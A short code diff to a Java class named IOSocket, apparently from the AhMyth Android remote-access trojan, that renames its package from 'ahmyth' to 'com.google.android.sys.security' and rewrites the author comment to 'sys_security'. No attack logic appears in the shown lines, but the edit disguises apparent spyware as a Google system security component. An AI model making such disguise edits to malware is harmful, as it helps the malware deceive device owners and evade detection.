@@ -1,4 +1,4 @@
-package ahmyth.mine.king.ahmyth;
+package com.google.android.sys.security;
 
 import android.os.Build;
 import android.provider.Settings;
@@ -9,7 +9,7 @@ import io.socket.client.IO;
 import io.socket.client.Socket;
 
 /**
- * Created by AhMyth on 10/14/16.
+ * Created by sys_security on 10/14/16.
  */
 public class IOSocket {
     private static IOSocket ourInstance;
